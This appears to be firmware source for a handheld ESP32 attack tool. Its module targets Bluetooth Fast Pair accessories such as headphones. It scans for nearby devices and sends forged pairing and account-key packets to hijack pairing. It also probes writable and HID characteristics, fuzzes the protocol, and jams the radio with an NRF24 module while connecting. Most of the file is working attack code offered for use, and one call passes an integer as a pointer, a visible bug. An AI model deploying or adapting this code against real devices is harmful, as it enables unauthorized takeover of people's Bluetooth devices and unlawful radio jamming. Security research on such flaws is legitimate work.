#include "whisperpair.h"
#include "whisperpair_audio.h"
#include "fastpair_crypto.h"
#include <globals.h>
#include "core/display.h"
#include "core/mykeyboard.h"
#include "core/utils.h"
#include "esp_mac.h"
#include "modules/NRF24/nrf_jammer_api.h"
#include <algorithm>
#include "esp_heap_caps.h"

extern std::vector<String> fastPairDevices;
extern bool returnToMenu;
extern volatile int tftWidth;
extern volatile int tftHeight;

AudioCommandService audioCmd;
FastPairCrypto crypto;

bool g_bleInitialized = false;

bool initializeBLEOnce(const char* deviceName = "Bruce-WP") {
    static bool initialized = false;
    if (!initialized) {
        NimBLEDevice::init(deviceName);
        NimBLEDevice::setPower(ESP_PWR_LVL_P9);
        NimBLEDevice::setSecurityAuth(false, false, false);
        NimBLEDevice::setMTU(250);
        initialized = true;
        g_bleInitialized = true;
    }
    return true;
}

class MyClientCallback : public NimBLEClientCallbacks {
    void onConnect(NimBLEClient* pClient) {
    }
    
    void onDisconnect(NimBLEClient* pClient) {
    }
    
    bool onConnParamsUpdateRequest(NimBLEClient* pClient, const ble_gap_upd_params* params) {
        return true;
    }
    
    uint32_t onPassKeyRequest() {
        return 0;
    }
    
    void onAuthenticationComplete(ble_gap_conn_desc* desc) {
    }
};

MyClientCallback clientCB;

CapturedKeys g_capturedKeys;
bool g_capturing = false;
NimBLEAddress g_capturedPhoneAddr;
NimBLEAddress g_capturedTargetAddr;

class PairingCaptureCallback : public NimBLEScanCallbacks {
    void onResult(NimBLEAdvertisedDevice* advertisedDevice) {
        if(!g_capturing) return;
        
        if(advertisedDevice->haveManufacturerData()) {
            std::string mfg = advertisedDevice->getManufacturerData();
            if(mfg.length() >= 2) {
                uint16_t mfg_id = (mfg[1] << 8) | mfg[0];
                
                if(mfg_id == 0x00E0 || mfg_id == 0x2C00) {
                    if(mfg.length() >= 4) {
                        uint8_t msg_type = mfg[2];
                        if(msg_type == 0x00) {
                            g_capturedPhoneAddr = advertisedDevice->getAddress();
                        } else if(msg_type == 0x10 || msg_type == 0x20) {
                            g_capturedTargetAddr = advertisedDevice->getAddress();
                        }
                    }
                }
            }
        }
    }
};

PairingCaptureCallback pairingCaptureCB;

bool safeConnectWithRetry(NimBLEAddress target, int maxRetries, NimBLEClient** outClient) {
    for(int attempt = 0; attempt < maxRetries; attempt++) {
        size_t freeHeap = esp_get_free_heap_size();
        if(freeHeap < 30000) {
            delay(500);
            continue;
        }
        
        NimBLEClient* pClient = NimBLEDevice::createClient();
        if(!pClient) {
            delay(1000);
            continue;
        }
        
        pClient->setClientCallbacks(&clientCB);
        pClient->setConnectTimeout(5);
        
        if(pClient->connect(target, true)) {
            if(pClient->isConnected()) {
                *outClient = pClient;
                delay(200);
                return true;
            }
        }
        
        if(pClient->isConnected()) {
            pClient->disconnect();
        }
        NimBLEDevice::deleteClient(pClient);
        delay(1000);
    }
    
    return false;
}

void showDeviceInfoScreen(const char* title, const std::vector<String>& lines, uint16_t bgColor, uint16_t textColor) {
    tft.fillScreen(bgColor);
    drawMainBorderWithTitle(title);
    tft.setTextColor(textColor, bgColor);
    int yPos = 60;
    int lineHeight = 20;
    int maxLines = 8;
    for(int i = 0; i < std::min((int)lines.size(), maxLines); i++) {
        tft.setCursor(20, yPos);
        String displayLine = lines[i];
        if(displayLine.length() > 35) {
            displayLine = displayLine.substring(0, 32) + "...";
        }
        tft.print(displayLine);
        yPos += lineHeight;
    }
    tft.setCursor(20, 220);
    tft.print("Press any key to continue...");
    while(true) {
        if(check(EscPress) || check(SelPress) || check(PrevPress) || check(NextPress)) {
            delay(200);
            return;
        }
        delay(50);
    }
}

int8_t showAdaptiveMessage(const char* line1, const char* btn1, const char* btn2, const char* btn3, uint16_t color, bool showEscHint, bool autoProgress) {
    int buttonCount = 0;
    if(strlen(btn1) > 0) buttonCount++;
    if(strlen(btn2) > 0) buttonCount++;
    if(strlen(btn3) > 0) buttonCount++;
    if(buttonCount == 0 && autoProgress) {
        tft.fillScreen(bruceConfig.bgColor);
        drawMainBorderWithTitle("MESSAGE");
        tft.setTextColor(color, bruceConfig.bgColor);
        tft.setCursor(20, 70);
        String lineStr = line1;
        if(lineStr.length() > 30) {
            tft.print(lineStr.substring(0, 30));
            tft.setCursor(20, 95);
            if(lineStr.length() > 60) {
                tft.print(lineStr.substring(30, 60) + "...");
            } else {
                tft.print(lineStr.substring(30));
            }
        } else {
            tft.print(line1);
        }
        delay(1500);
        return 0;
    }
    if(buttonCount == 0) {
        tft.fillScreen(bruceConfig.bgColor);
        drawMainBorderWithTitle("MESSAGE");
        tft.fillRect(20, 60, tftWidth - 40, 100, bruceConfig.bgColor);
        tft.setTextColor(color, bruceConfig.bgColor);
        tft.setCursor(20, 70);
        String lineStr = line1;
        if(lineStr.length() > 30) {
            tft.print(lineStr.substring(0, 30));
            tft.setCursor(20, 95);
            if(lineStr.length() > 60) {
                tft.print(lineStr.substring(30, 60) + "...");
            } else {
                tft.print(lineStr.substring(30));
            }
        } else {
            tft.print(line1);
        }
        tft.setCursor(20, 140);
        tft.print("Press any key to continue...");
        while(true) {
            if(check(EscPress) || check(SelPress) || check(PrevPress) || check(NextPress)) {
                delay(200);
                return 0;
            }
            delay(50);
        }
    }
    else if(buttonCount == 1) {
        const char* buttons[] = {btn1, btn2, btn3};
        const char* actualBtn = "";
        for(int i = 0; i < 3; i++) {
            if(strlen(buttons[i]) > 0) {
                actualBtn = buttons[i];
                break;
            }
        }
        tft.fillScreen(bruceConfig.bgColor);
        drawMainBorderWithTitle("MESSAGE");
        tft.fillRect(20, 60, tftWidth - 40, 60, bruceConfig.bgColor);
        tft.setTextColor(color, bruceConfig.bgColor);
        tft.setCursor(20, 70);
        String lineStr = line1;
        if(lineStr.length() > 30) {
            tft.print(lineStr.substring(0, 30));
            if(lineStr.length() > 60) {
                tft.setCursor(20, 95);
                tft.print(lineStr.substring(30, 60) + "...");
            }
        } else {
            tft.print(line1);
        }
        String btnText = actualBtn;
        if(btnText.length() > 12) {
            btnText = btnText.substring(0, 9) + "...";
        }
        int btnWidth = btnText.length() * 12 + 20;
        if(btnWidth < 100) btnWidth = 100;
        int btnX = (tftWidth - btnWidth) / 2;
        int btnY = 150;
        tft.fillRoundRect(btnX, btnY, btnWidth, 35, 5, bruceConfig.priColor);
        tft.setTextColor(TFT_WHITE, bruceConfig.priColor);
        int textWidth = btnText.length() * 6;
        int textX = btnX + (btnWidth - textWidth) / 2;
        tft.setCursor(textX, btnY + 12);
        tft.print(btnText);
        tft.setTextColor(TFT_WHITE, bruceConfig.bgColor);
        tft.setCursor(20, 200);
        tft.print("SEL: Select  ESC: Cancel");
        while(true) {
            if(check(EscPress)) {
                delay(200);
                return -1;
            }
            if(check(SelPress)) {
                delay(200);
                return 0;
            }
            delay(50);
        }
    }
    else {
        tft.fillScreen(bruceConfig.bgColor);
        drawMainBorderWithTitle("SELECT");
        tft.setTextColor(color, bruceConfig.bgColor);
        tft.setCursor(20, 70);
        tft.print(line1);
        
        int btnWidth = 80;
        int btnHeight = 35;
        int btnY = 150;
        int8_t result = -2;
        
        if(strlen(btn1) > 0) {
            tft.fillRoundRect(50, btnY, btnWidth, btnHeight, 5, bruceConfig.priColor);
            tft.setTextColor(TFT_WHITE, bruceConfig.priColor);
            tft.setCursor(60, btnY + 12);
            String btn1Str = btn1;
            if(btn1Str.length() > 8) btn1Str = btn1Str.substring(0, 5) + "...";
            tft.print(btn1Str);
        }
        
        if(strlen(btn2) > 0) {
            tft.fillRoundRect(150, btnY, btnWidth, btnHeight, 5, bruceConfig.secColor);
            tft.setTextColor(TFT_WHITE, bruceConfig.secColor);
            tft.setCursor(160, btnY + 12);
            String btn2Str = btn2;
            if(btn2Str.length() > 8) btn2Str = btn2Str.substring(0, 5) + "...";
            tft.print(btn2Str);
        }
        
        tft.setTextColor(TFT_WHITE, bruceConfig.bgColor);
        tft.setCursor(20, 200);
        if(strlen(btn3) > 0) {
            tft.print("SEL: Btn1  NEXT: Btn2  ESC: Cancel");
        } else {
            tft.print("SEL: Btn1  NEXT: Btn2  ESC: Back");
        }
        
        while(true) {
            if(check(EscPress)) {
                delay(200);
                return -1;
            }
            if(check(SelPress)) {
                delay(200);
                return 0;
            }
            if(check(NextPress)) {
                delay(200);
                return 1;
            }
            if(strlen(btn3) > 0 && check(PrevPress)) {
                delay(200);
                return 2;
            }
            delay(50);
        }
    }
}

void showWarningMessage(const char* message) {
    tft.fillScreen(TFT_YELLOW);
    drawMainBorderWithTitle("WARNING");
    tft.setTextColor(TFT_BLACK, TFT_YELLOW);
    tft.fillRect(20, 60, tftWidth - 40, 100, TFT_YELLOW);
    tft.setCursor(20, 70);
    String msgStr = message;
    if(msgStr.length() > 30) {
        tft.print(msgStr.substring(0, 30));
        tft.setCursor(20, 95);
        if(msgStr.length() > 60) {
            tft.print(msgStr.substring(30, 60) + "...");
        } else {
            tft.print(msgStr.substring(30));
        }
    } else {
        tft.print(message);
    }
    tft.setCursor(20, 140);
    tft.print("Press any key to continue...");
    while(true) {
        if(check(EscPress) || check(SelPress) || check(PrevPress) || check(NextPress)) {
            delay(200);
            return;
        }
        delay(50);
    }
}

void showErrorMessage(const char* message) {
    tft.fillScreen(TFT_RED);
    drawMainBorderWithTitle("ERROR");
    tft.setTextColor(TFT_WHITE, TFT_RED);
    tft.fillRect(20, 60, tftWidth - 40, 100, TFT_RED);
    tft.setCursor(20, 70);
    String msgStr = message;
    if(msgStr.length() > 30) {
        tft.print(msgStr.substring(0, 30));
        tft.setCursor(20, 95);
        if(msgStr.length() > 60) {
            tft.print(msgStr.substring(30, 60) + "...");
        } else {
            tft.print(msgStr.substring(30));
        }
    } else {
        tft.print(message);
    }
    tft.setCursor(20, 140);
    tft.print("Press any key to continue...");
    while(true) {
        if(check(EscPress) || check(SelPress) || check(PrevPress) || check(NextPress)) {
            delay(200);
            return;
        }
        delay(50);
    }
}

void showSuccessMessage(const char* message) {
    tft.fillScreen(TFT_GREEN);
    drawMainBorderWithTitle("SUCCESS");
    tft.setTextColor(TFT_BLACK, TFT_GREEN);
    tft.fillRect(20, 60, tftWidth - 40, 100, TFT_GREEN);
    tft.setCursor(20, 70);
    String msgStr = message;
    if(msgStr.length() > 30) {
        tft.print(msgStr.substring(0, 30));
        tft.setCursor(20, 95);
        if(msgStr.length() > 60) {
            tft.print(msgStr.substring(30, 60) + "...");
        } else {
            tft.print(msgStr.substring(30));
        }
    } else {
        tft.print(message);
    }
    tft.setCursor(20, 140);
    tft.print("Press any key to continue...");
    while(true) {
        if(check(EscPress) || check(SelPress) || check(PrevPress) || check(NextPress)) {
            delay(200);
            return;
        }
        delay(50);
    }
}

bool initBLEIfNeeded(const char* deviceName) {
    return initializeBLEOnce(deviceName);
}

bool requireSimpleConfirmation(const char* message) {
    drawMainBorderWithTitle("CONFIRM");
    tft.fillRect(20, 50, tftWidth - 40, 100, bruceConfig.bgColor);
    tft.setTextColor(TFT_WHITE, bruceConfig.bgColor);
    tft.setCursor(20, 60);
    String msgStr = message;
    if(msgStr.length() > 30) {
        tft.print(msgStr.substring(0, 30));
        tft.setCursor(20, 85);
        if(msgStr.length() > 60) {
            tft.print(msgStr.substring(30, 60) + "...");
        } else {
            tft.print(msgStr.substring(30));
        }
    } else {
        tft.print(message);
    }
    while(true) {
        if(check(EscPress)) {
            showAdaptiveMessage("Cancelled", "OK", "", "", TFT_WHITE, true, false);
            return false;
        }
        if(check(SelPress)) {
            showAdaptiveMessage("Confirmed!", "OK", "", "", TFT_WHITE, true, false);
            delay(300);
            return true;
        }
        delay(50);
    }
}

NimBLEAddress parseAddress(const String& addressInfo) {
    int colonPos = addressInfo.lastIndexOf(':');
    if(colonPos == -1) {
        return NimBLEAddress();
    }
    String mac = addressInfo.substring(0, colonPos);
    uint8_t type = addressInfo.substring(colonPos + 1).toInt();
    return NimBLEAddress(mac.c_str(), type);
}

bool fastPairExploit(NimBLEAddress target) {
    NimBLEClient* pClient = nullptr;
    
    if(!safeConnectWithRetry(target, 2, &pClient)) {
        showErrorMessage("Connection failed");
        return false;
    }
    
    if(!pClient || !pClient->isConnected()) {
        showErrorMessage("Client not connected");
        if(pClient) {
            NimBLEDevice::deleteClient(pClient);
        }
        return false;
    }
    
    NimBLERemoteService* pService = pClient->getService(NimBLEUUID((uint16_t)0xFE2C));
    if(!pService) {
        pClient->disconnect();
        NimBLEDevice::deleteClient(pClient);
        showErrorMessage("No FastPair service");
        return false;
    }
    
    NimBLERemoteCharacteristic* pKbpChar = pService->getCharacteristic(NimBLEUUID((uint16_t)0x1234));
    if(!pKbpChar || !pKbpChar->canWrite()) {
        pClient->disconnect();
        NimBLEDevice::deleteClient(pClient);
        showErrorMessage("No writable KBP");
        return false;
    }
    
    showAdaptiveMessage("Attempting exploit...", "", "", "", TFT_YELLOW, false, true);
    
    uint8_t our_pubkey[65];
    size_t pub_len = 65;
    if(!crypto.generateValidKeyPair(our_pubkey, &pub_len)) {
        pClient->disconnect();
        NimBLEDevice::deleteClient(pClient);
        showErrorMessage("Key gen failed");
        return false;
    }
    
    uint8_t seeker_hello[67] = {0};
    seeker_hello[0] = 0x00;
    seeker_hello[1] = 0x00;
    memcpy(&seeker_hello[2], our_pubkey, 65);
    
    if(!pKbpChar->writeValue(seeker_hello, 67, true)) {
        pClient->disconnect();
        NimBLEDevice::deleteClient(pClient);
        showErrorMessage("Initial packet failed");
        return false;
    }
    
    delay(100);
    
    uint8_t pairing_complete[34] = {0};
    pairing_complete[0] = 0x02;
    uint8_t nonce[16];
    crypto.generateValidNonce(nonce);
    memcpy(&pairing_complete[1], nonce, 16);
    uint8_t fake_data[16];
    esp_fill_random(fake_data, 16);
    memcpy(&pairing_complete[17], fake_data, 16);
    pairing_complete[33] = 0x00;
    
    if(!pKbpChar->writeValue(pairing_complete, 34, true)) {
        showWarningMessage("Pairing failed");
    } else {
        showAdaptiveMessage("Pairing sent!", "", "", "", TFT_GREEN, false, true);
    }
    
    NimBLERemoteCharacteristic* pAccountChar = pService->getCharacteristic(NimBLEUUID((uint16_t)0x1236));
    if(pAccountChar && pAccountChar->canWrite()) {
        uint8_t account_key[16];
        crypto.generatePlausibleAccountKey(nonce, account_key);
        uint8_t account_msg[18] = {0};
        account_msg[0] = 0x04;
        memcpy(&account_msg[1], account_key, 16);
        account_msg[17] = 0x00;
        
        if(pAccountChar->writeValue(account_msg, 18, true)) {
            delay(200);
            std::string response = pAccountChar->readValue();
            if(response.length() > 0) {
                showSuccessMessage("DEVICE MAY BE VULNERABLE!");
                pClient->disconnect();
                NimBLEDevice::deleteClient(pClient);
                return true;
            } else {
                showWarningMessage("Key sent but no response");
            }
        }
    }
    
    const std::vector<NimBLERemoteCharacteristic*> chars = pService->getCharacteristics(true);
    for(auto pChar : chars) {
        String uuid = pChar->getUUID().toString().c_str();
        if(uuid.indexOf("1234") != -1 || uuid.indexOf("1236") != -1) continue;
        if(pChar->canWrite()) {
            uint8_t test_data[2] = {0x00, 0x00};
            if(pChar->writeValue(test_data, 2, false)) {
                showAdaptiveMessage("Can write to:", uuid.c_str(), "", "", TFT_YELLOW, false, true);
            }
        }
    }
    
    if(pClient->isConnected()) {
        pClient->disconnect();
    }
    NimBLEDevice::deleteClient(pClient);
    
    showAdaptiveMessage("Exploit attempt complete", "", "", "", TFT_WHITE, false, true);
    return true;
}

bool attemptAccountKeyInjection(NimBLEAddress target, CapturedKeys& keys) {
    NimBLEClient* pClient = nullptr;
    if(!safeConnectWithRetry(target, 2, &pClient)) {
        return false;
    }
    
    NimBLERemoteService* pService = pClient->getService(NimBLEUUID((uint16_t)0xFE2C));
    if(!pService) {
        pClient->disconnect();
        NimBLEDevice::deleteClient(pClient);
        return false;
    }
    
    NimBLERemoteCharacteristic* pKbpChar = pService->getCharacteristic(NimBLEUUID((uint16_t)0x1234));
    if(!pKbpChar) {
        pClient->disconnect();
        NimBLEDevice::deleteClient(pClient);
        return false;
    }
    
    uint8_t seeker_hello[67] = {0};
    seeker_hello[0] = 0x00;
    seeker_hello[1] = 0x00;
    
    if(keys.keys_captured) {
        memcpy(&seeker_hello[2], keys.phone_public_key, 65);
    } else {
        crypto.generateValidKeyPair(keys.phone_public_key, (size_t*)65);
        memcpy(&seeker_hello[2], keys.phone_public_key, 65);
    }
    
    if(!pKbpChar->writeValue(seeker_hello, 67, true)) {
        pClient->disconnect();
        NimBLEDevice::deleteClient(pClient);
        return false;
    }
    
    delay(100);
    
    std::string response = pKbpChar->readValue();
    if(response.length() >= 65) {
        memcpy(keys.target_public_key, response.data() + 2, 65);
    }
    
    uint8_t pairing_complete[34] = {0};
    pairing_complete[0] = 0x02;
    
    uint8_t nonce[16];
    crypto.generateValidNonce(nonce);
    memcpy(&pairing_complete[1], nonce, 16);
    
    uint8_t fake_payload[16];
    esp_fill_random(fake_payload, 16);
    memcpy(&pairing_complete[17], fake_payload, 16);
    pairing_complete[33] = 0x00;
    
    if(!pKbpChar->writeValue(pairing_complete, 34, true)) {
    } else {
    }
    
    delay(200);
    NimBLERemoteCharacteristic* pAccountChar = pService->getCharacteristic(NimBLEUUID((uint16_t)0x1236));
    if(pAccountChar && pAccountChar->canWrite()) {
        uint8_t account_key[16];
        if(keys.keys_captured) {
            memcpy(account_key, keys.account_key, 16);
        } else {
            crypto.generatePlausibleAccountKey(nonce, account_key);
        }
        
        uint8_t account_msg[18] = {0};
        account_msg[0] = 0x04;
        memcpy(&account_msg[1], account_key, 16);
        account_msg[17] = 0x00;
        
        if(pAccountChar->writeValue(account_msg, 18, true)) {
            delay(100);
            std::string ack = pAccountChar->readValue();
            if(ack.length() > 0) {
                memcpy(keys.account_key, account_key, 16);
                keys.keys_captured = true;
                showSuccessMessage("KEY INJECTION ATTEMPTED!");
                pClient->disconnect();
                NimBLEDevice::deleteClient(pClient);
                return true;
            }
        }
    }
    
    pClient->disconnect();
    NimBLEDevice::deleteClient(pClient);
    
    return false;
}

bool testWriteAccessVulnerability(NimBLEAddress target) {
    NimBLEClient* pClient = nullptr;
    if(!safeConnectWithRetry(target, 2, &pClient)) {
        return false;
    }
    
    bool foundWritable = false;
    std::vector<String> vulnerableServices;
    
    const std::vector<NimBLERemoteService*> services = pClient->getServices(true);
    
    for(auto pService : services) {
        const std::vector<NimBLERemoteCharacteristic*> chars = pService->getCharacteristics(true);
        
        for(auto pChar : chars) {
            if(pChar->canWrite()) {
                String uuid = pChar->getUUID().toString().c_str();
                String svcUUID = pService->getUUID().toString().c_str();
                vulnerableServices.push_back(svcUUID + " -> " + uuid);
                foundWritable = true;
                continue;
            }
            
            try {
                uint8_t testByte = 0x00;
                if(pChar->writeValue(&testByte, 1, false)) {
                    String uuid = pChar->getUUID().toString().c_str();
                    String svcUUID = pService->getUUID().toString().c_str();
                    vulnerableServices.push_back(svcUUID + " -> " + uuid + " (NO-RESP)");
                    foundWritable = true;
                }
            } catch(...) {
            }
        }
    }
    
    if(pClient->isConnected()) {
        pClient->disconnect();
    }
    NimBLEDevice::deleteClient(pClient);
    
    if(foundWritable) {
        showDeviceInfoScreen("WRITABLE CHARACTERISTICS", vulnerableServices, TFT_GREEN, TFT_BLACK);
        return true;
    }
    
    return false;
}

bool testAudioControls(NimBLEAddress target) {
    NimBLEClient* pClient = nullptr;
    
    if(!safeConnectWithRetry(target, 2, &pClient)) return false;
    
    bool foundControl = false;
    
    NimBLERemoteService* pAvrcpService = pClient->getService(NimBLEUUID((uint16_t)0x110E));
    if(pAvrcpService) {
        NimBLERemoteCharacteristic* pVolChar = pAvrcpService->getCharacteristic(NimBLEUUID((uint16_t)0x2BE1));
        if(pVolChar && pVolChar->canWrite()) {
            foundControl = true;
            showAdaptiveMessage("AVRCP volume control found", "", "", "", TFT_GREEN, false, true);
        }
    }
    
    NimBLERemoteService* pMediaService = pClient->getService(NimBLEUUID((uint16_t)0x110B));
    if(pMediaService) {
        NimBLERemoteCharacteristic* pPlayChar = pMediaService->getCharacteristic(NimBLEUUID((uint16_t)0x2BE2));
        if(pPlayChar && pPlayChar->canWrite()) {
            foundControl = true;
            showAdaptiveMessage("Media control found", "", "", "", TFT_GREEN, false, true);
        }
    }
    
    if(pClient->isConnected()) {
        pClient->disconnect();
    }
    NimBLEDevice::deleteClient(pClient);
    
    if(!foundControl) {
        showErrorMessage("No audio controls found");
    }
    
    return foundControl;
}

bool testHIDCommands(NimBLEAddress target) {
    NimBLEClient* pClient = nullptr;
    if(!safeConnectWithRetry(target, 2, &pClient)) return false;
    
    bool foundHID = false;
    
    NimBLERemoteService* pHidService = pClient->getService(NimBLEUUID((uint16_t)0x1812));
    if(pHidService) {
        const std::vector<NimBLERemoteCharacteristic*> chars = pHidService->getCharacteristics(true);
        for(auto pChar : chars) {
            String uuid = pChar->getUUID().toString().c_str();
            
            if(uuid.indexOf("2A4D") != -1 || 
               uuid.indexOf("2A4E") != -1 || 
               uuid.indexOf("2A4F") != -1) {
                
                if(pChar->canWrite()) {
                    foundHID = true;
                    showAdaptiveMessage("HID control found:", uuid.c_str(), "", "", TFT_GREEN, false, true);
                }
            }
        }
    }
    
    if(pClient->isConnected()) {
        pClient->disconnect();
    }
    NimBLEDevice::deleteClient(pClient);
    
    if(!foundHID) {
        showErrorMessage("No HID controls found");
    }
    
    return foundHID;
}

void runProtocolFuzzer(NimBLEAddress target) {
    NimBLEClient* pClient = nullptr;
    if(!safeConnectWithRetry(target, 2, &pClient)) return;
    
    NimBLERemoteService* pService = pClient->getService(NimBLEUUID((uint16_t)0xFE2C));
    if(!pService) {
        pClient->disconnect();
        NimBLEDevice::deleteClient(pClient);
        showErrorMessage("No FastPair service");
        return;
    }
    
    NimBLERemoteCharacteristic* pChar = pService->getCharacteristic(NimBLEUUID((uint16_t)0x1234));
    if(!pChar || !pChar->canWrite()) {
        pClient->disconnect();
        NimBLEDevice::deleteClient(pClient);
        showErrorMessage("No writable KBP");
        return;
    }
    
    tft.fillScreen(TFT_RED);
    drawMainBorderWithTitle("PROTOCOL FUZZER");
    tft.setTextColor(TFT_WHITE, TFT_RED);
    tft.setCursor(20, 60);
    tft.print("Fuzzing FastPair protocol...");
    
    uint8_t testCases[][20] = {
        {0x00},
        {0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
        {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF},
        {0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
        {0x00, 0xFF, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
    };
    
    for(int i = 0; i < 5; i++) {
        tft.setCursor(20, 90 + (i * 20));
        tft.printf("Test %d: ", i + 1);
        
        if(pChar->writeValue(testCases[i], sizeof(testCases[i]), false)) {
            tft.print("ACCEPTED (BUG!)");
        } else {
            tft.print("rejected");
        }
        delay(500);
    }
    
    if(pClient->isConnected()) {
        pClient->disconnect();
    }
    NimBLEDevice::deleteClient(pClient);
    
    tft.setCursor(20, 200);
    tft.print("Fuzzing complete!");
    delay(2000);
}

String selectTargetFromScan(const char* title) {
    String selectedMAC = "";
    uint8_t selectedAddrType = BLE_ADDR_PUBLIC;
    
    tft.fillScreen(bruceConfig.bgColor);
    drawMainBorderWithTitle(title);
    tft.setTextColor(TFT_WHITE, bruceConfig.bgColor);
    tft.fillRect(20, 60, tftWidth - 40, 40, bruceConfig.bgColor);
    tft.setCursor(20, 60);
    tft.print("Initializing scanner...");
    
    initializeBLEOnce("Bruce-WP");
    
    NimBLEScan* pBLEScan = NimBLEDevice::getScan();
    if(!pBLEScan) {
        showErrorMessage("Failed to create scanner");
        return "";
    }
    
    pBLEScan->clearResults();
    pBLEScan->setActiveScan(true);
    pBLEScan->setInterval(97);
    pBLEScan->setWindow(48);
    pBLEScan->setDuplicateFilter(true);
    pBLEScan->setMaxResults(50);
    
    tft.fillRect(20, 60, tftWidth - 40, 40, bruceConfig.bgColor);
    tft.setCursor(20, 60);
    tft.print("Scanning for 15s...");
    
    NimBLEScanResults foundDevices = pBLEScan->start(15, false);
    
    struct ScanDevice {
        String name;
        String address;
        uint8_t addrType;
        int rssi;
        bool fastPair;
    };
    std::vector<ScanDevice> devices;
    
    for(int i = 0; i < foundDevices.getCount(); i++) {
        const NimBLEAdvertisedDevice* device = foundDevices.getDevice(i);
        if(!device) continue;
        
        ScanDevice dev;
        dev.name = device->getName().c_str();
        dev.address = device->getAddress().toString().c_str();
        dev.addrType = device->getAddressType();
        dev.rssi = device->getRSSI();
        dev.fastPair = false;
        
        if(dev.name.isEmpty() || dev.name == "(null)") {
            dev.name = dev.address;
        }
        
        if(device->haveManufacturerData()) {
            std::string mfg = device->getManufacturerData();
            if(mfg.length() >= 2) {
                uint16_t mfg_id = (mfg[1] << 8) | mfg[0];
                if(mfg_id == 0x00E0 || mfg_id == 0x2C00) {
                    dev.fastPair = true;
                }
            }
        }
        
        devices.push_back(dev);
    }
    
    pBLEScan->clearResults();
    
    if(devices.empty()) {
        showWarningMessage("NO DEVICES FOUND");
        delay(1500);
        return "";
    }
    
    std::sort(devices.begin(), devices.end(), [](const ScanDevice& a, const ScanDevice& b) {
        if(a.fastPair != b.fastPair) return a.fastPair;
        return a.rssi > b.rssi;
    });
    
    const int maxDevices = std::min((int)devices.size(), 6);
    int selectedIdx = 0;
    bool exitLoop = false;
    
    while(!exitLoop) {
        tft.fillScreen(bruceConfig.bgColor);
        drawMainBorderWithTitle("SELECT DEVICE");
        tft.setTextColor(TFT_WHITE, bruceConfig.bgColor);
        int yPos = 60;
        
        for(int i = 0; i < maxDevices; i++) {
            const auto& dev = devices[i];
            String displayText = dev.name;
            if(displayText.length() > 18) {
                displayText = displayText.substring(0, 15) + "...";
            }
            displayText += " (" + String(dev.rssi) + "dB)";
            if(dev.fastPair) displayText += " [FP]";
            
            if(i == selectedIdx) {
                tft.fillRect(20, yPos, tftWidth - 40, 22, TFT_WHITE);
                tft.setTextColor(TFT_BLACK, TFT_WHITE);
            } else {
                tft.fillRect(20, yPos, tftWidth - 40, 22, bruceConfig.bgColor);
                tft.setTextColor(TFT_WHITE, bruceConfig.bgColor);
            }
            
            tft.setCursor(25, yPos + 6);
            tft.print(displayText);
            yPos += 24;
        }
        
        tft.setCursor(20, yPos + 10);
        tft.print("UP/DOWN: Select  SEL: Connect  ESC: Back");
        
        unsigned long inputWaitStart = millis();
        bool gotInput = false;
        
        while(!gotInput && millis() - inputWaitStart < 30000) {
            if(check(PrevPress)) {
                if(selectedIdx > 0) selectedIdx--;
                gotInput = true;
                delay(200);
            }
            else if(check(NextPress)) {
                if(selectedIdx < maxDevices - 1) selectedIdx++;
                gotInput = true;
                delay(200);
            }
            else if(check(SelPress)) {
                tft.fillRect(20, yPos + 40, tftWidth - 40, 30, bruceConfig.bgColor);
                tft.setCursor(20, yPos + 40);
                tft.print("Connecting...");
                delay(500);
                selectedMAC = devices[selectedIdx].address;
                selectedAddrType = devices[selectedIdx].addrType;
                exitLoop = true;
                gotInput = true;
            }
            else if(check(EscPress)) {
                exitLoop = true;
                gotInput = true;
            }
            if(!gotInput) delay(10);
        }
        
        if(millis() - inputWaitStart >= 30000) {
            showWarningMessage("Selection timeout");
            break;
        }
    }
    
    if (!selectedMAC.isEmpty()) {
        return selectedMAC + ":" + String(selectedAddrType);
    }
    return "";
}

bool jamAndConnectEnhanced(NimBLEAddress target) {
    showDeviceInfoScreen("JAM & CONNECT", 
        {"Starting jam...", 
         "Jamming for 8 seconds",
         "Attempting connection"}, 
        TFT_YELLOW, TFT_BLACK);
    
    startJammer();
    
    NimBLEClient* pClient = nullptr;
    bool connected = false;
    unsigned long startTime = millis();
    
    while(millis() - startTime < 8000 && !connected) {
        updateJammerChannel();
        
        NimBLEClient* tempClient = nullptr;
        if(safeConnectWithRetry(target, 1, &tempClient)) {
            connected = true;
            pClient = tempClient;
            break;
        }
        
        delay(200);
    }
    
    stopJammer();
    
    if(connected && pClient) {
        showSuccessMessage("CONNECTED WHILE JAMMING!");
        
        NimBLERemoteService* pService = pClient->getService(NimBLEUUID((uint16_t)0xFE2C));
        if(pService) {
            showAdaptiveMessage("FastPair accessible!", "", "", "", TFT_GREEN, false, true);
        }
        
        if(pClient->isConnected()) {
            pClient->disconnect();
        }
        NimBLEDevice::deleteClient(pClient);
        return true;
    }
    
    if(pClient) {
        NimBLEDevice::deleteClient(pClient);
    }
    
    showErrorMessage("Jam & connect failed");
    return false;
}

void audioControlTestMenu() {
    std::vector<Option> options;
    options.push_back({"[Test Volume Control]", []() {
        String targetInfo = selectTargetFromScan("SELECT TARGET");
        if(targetInfo.isEmpty()) return;
        NimBLEAddress target = parseAddress(targetInfo);
        if(requireSimpleConfirmation("Test volume control?")) {
            if(testAudioControls(target)) {
                showSuccessMessage("Audio controls found!");
            }
        }
    }});
    options.push_back({"[Test Media Control]", []() {
        String targetInfo = selectTargetFromScan("SELECT TARGET");
        if(targetInfo.isEmpty()) return;
        NimBLEAddress target = parseAddress(targetInfo);
        if(requireSimpleConfirmation("Test media control?")) {
            NimBLEClient* pClient = nullptr;
            if(safeConnectWithRetry(target, 2, &pClient)) {
                NimBLERemoteService* pMediaService = pClient->getService(NimBLEUUID((uint16_t)0x110B));
                if(pMediaService) {
                    NimBLERemoteCharacteristic* pPlayChar = pMediaService->getCharacteristic(NimBLEUUID((uint16_t)0x2BE2));
                    if(pPlayChar && pPlayChar->canWrite()) {
                        uint8_t playCmd[] = {0x00, 0x48, 0x00, 0x1A, 0x01};
                        if(pPlayChar->writeValue(playCmd, 5, false)) {
                            showSuccessMessage("Media control works!");
                        }
                    }
                }
                if(pClient->isConnected()) {
                    pClient->disconnect();
                }
                NimBLEDevice::deleteClient(pClient);
            }
        }
    }});
